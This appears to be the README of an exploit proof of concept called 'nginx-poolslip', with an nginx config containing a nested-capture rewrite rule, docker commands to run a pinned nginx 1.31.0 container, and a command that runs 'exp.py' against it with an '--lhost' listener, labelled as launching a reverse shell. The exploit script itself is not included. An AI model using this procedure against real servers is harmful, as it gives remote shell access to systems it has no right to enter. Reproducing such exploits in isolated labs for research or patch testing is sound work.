# nginx-poolslip

## Quick Start

Nginx config:
```
error_log stderr notice;

events {}

http {
    access_log off;

    server {
        listen 8080;
        server_name localhost;
        rewrite ^/((.+))$ /dst?a=$1&b=$2 last;
        location = /dst { return 204; }
    }
}
```

Start the Nginx official container:
```bash
docker pull --platform=linux/amd64 nginx:1.31.0-trixie@sha256:966242c15165ecae32475055025be129210d5a035e44d198419885fc3a863775

docker run --name nginx-poolslip -p 127.0.0.1:8080:8080 -v /host/path/nginx.conf:/etc/nginx/nginx.conf:ro -d nginx:1.31.0-trixie@sha256:966242c15165ecae32475055025be129210d5a035e44d198419885fc3a863775
```

Launch a reverse shell:
```bash
python3 -u exp.py 127.0.0.1 8080 --lhost 172.17.0.1
```

Cleanup:
```bash
docker rm -f nginx-poolslip
```
